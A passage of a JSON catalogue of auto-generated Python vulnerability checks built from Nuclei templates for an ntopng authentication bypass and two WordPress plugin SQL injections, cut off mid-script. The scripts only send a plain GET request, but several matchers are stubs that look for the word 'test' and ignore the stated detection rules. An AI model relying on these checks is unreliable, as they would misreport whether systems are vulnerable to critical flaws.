        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2021-28073\nName: Ntopng Authentication Bypass\nSeverity: critical\nDescription: Ntopng, a passive network monitoring tool, contains an authentication bypass vulnerability in ntopng <= 4.2\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2021_28073:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2021-28073\"\n    SEVERITY = \"critical\"\n    NAME = \"Ntopng Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'application/json\\' | mot(s) \\'\"results\":, \"name\":, \"tab\":\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['application/json', '\"results\":, \"name\":, \"tab\":']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Ntopng Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2021_28073(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2021-28073\nName: Ntopng Authentication Bypass\nSeverity: critical\nDescription: Ntopng, a passive network monitoring tool, contains an authentication bypass vulnerability in ntopng <= 4.2\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2021_28073:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2021-28073\"\n    SEVERITY = \"critical\"\n    NAME = \"Ntopng Authentication Bypass\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'application/json\\' | mot(s) \\'\"results\":, \"name\":, \"tab\":\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['application/json', '\"results\":, \"name\":, \"tab\":']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Ntopng Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2021_28073(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [
          "CVE-2021-28073"
        ],
        "tags": [
          "cve2021",
          "cve",
          "ntopng",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2022_3254",
        "name": "AWP Classifieds <= 4.2.1 - Unauthenticated SQL Injection",
        "language": "Python",
        "famille": "CVE",
        "description": "WordPress Classifieds Plugin before 4.3 contains a SQL injection caused by improper sanitization and escaping of parameters in an AJAX action, letting unauthenticated attackers execute arbitrary SQL commands, exploit requires the premium module to be active.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code == 200; startswith(trim(body), \"{\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2022-3254\nName: AWP Classifieds <= 4.2.1 - Unauthenticated SQL Injection\nSeverity: critical\nDescription: WordPress Classifieds Plugin before 4.3 contains a SQL injection caused by improper sanitization and escaping of parameters in an AJAX action, letting unauthenticated attackers execute arbitrary SQL commands, exploit requires the premium module to be active.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2022_3254:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2022-3254\"\n    SEVERITY = \"critical\"\n    NAME = \"AWP Classifieds <= 4.2.1 - Unauthenticated SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; startswith(trim(body), \"{\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"AWP Classifieds <= 4.2.1 - Unauthenticated SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2022_3254(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2022-3254\nName: AWP Classifieds <= 4.2.1 - Unauthenticated SQL Injection\nSeverity: critical\nDescription: WordPress Classifieds Plugin before 4.3 contains a SQL injection caused by improper sanitization and escaping of parameters in an AJAX action, letting unauthenticated attackers execute arbitrary SQL commands, exploit requires the premium module to be active.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2022_3254:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2022-3254\"\n    SEVERITY = \"critical\"\n    NAME = \"AWP Classifieds <= 4.2.1 - Unauthenticated SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 200; startswith(trim(body), \"{\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"AWP Classifieds <= 4.2.1 - Unauthenticated SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2022_3254(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cve",
          "cve2022",
          "sqli",
          "wordpress",
          "wp-plugin",
          "awpcp",
          "unauth",
          "wp",
          "vkev"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2022_3481",
        "name": "NotificationX Dropshipping < 4.4 - SQL Injection",
        "language": "Python",
        "famille": "CVE",
        "description": "The plugin does not properly sanitise and escape a parameter before using it in a SQL statement via a REST endpoint available to unauthenticated users, leading to a SQL injection",
        "severity": "critical",
        "detection": "[OR] DSL: duration>=7; status_code == 200",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2022-3481\nName: NotificationX Dropshipping < 4.4 - SQL Injection\nSeverity: critical\nDescription: The plugin does not properly sanitise and escape a parameter before using it in a SQL statement via a REST endpoint available to unauthenticated users, leading to a SQL injection\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2022_3481:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2022-3481\"\n    SEVERITY = \"critical\"\n    NAME = \"NotificationX Dropshipping < 4.4 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: duration>=7; status_code == 200'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"NotificationX Dropshipping < 4.4 - SQL Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2022_3481(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2022-3481\nName: NotificationX Dropshipping < 4.4 - SQL Injection\nSeverity: critical\nDescription: The plugin does not properly sanitise and escape a parameter before using it in a SQL statement via a REST endpoint available to unauthenticated users, leading to a SQL injection\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2022_3481:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2022-3481\"\n    SEVERITY = \"critical\"\n    NAME = \"NotificationX Dropshipping < 4.4 - SQL Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n      